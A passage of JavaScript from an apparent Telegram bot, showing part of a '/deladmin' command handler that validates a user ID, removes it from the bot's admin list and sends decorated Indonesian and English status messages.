   ( ⚠️ ) Akses Ditolak ( ⚠️ )
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫  
`,
      { parse_mode: "Markdown" }
    );
  }
  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      `
┣━━━━━━━━━━━━━━━━━━━━┫          
   ( ❌ ) Comand Salah ( ❌)
   /deladmin 6843967527 30d.
┣━━━━━━━━━━━━━━━━━━━━┫  
`
    );
  }
  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ❌ ) Comand Salah ( ❌)
   /deladmin 6843967527 30d.
┣━━━━━━━━━━━━━━━━━━━━┫  
`
    );
  }
  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendMessage(
      chatId,
      `
┣━━━━━━━━━━━━━━━━━━━━┫  
 ( ✅ ) SUCCES DELL USER 
User ${userId} has been removed
┣━━━━━━━━━━━━━━━━━━━━┫  
`
    );
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
  }
});
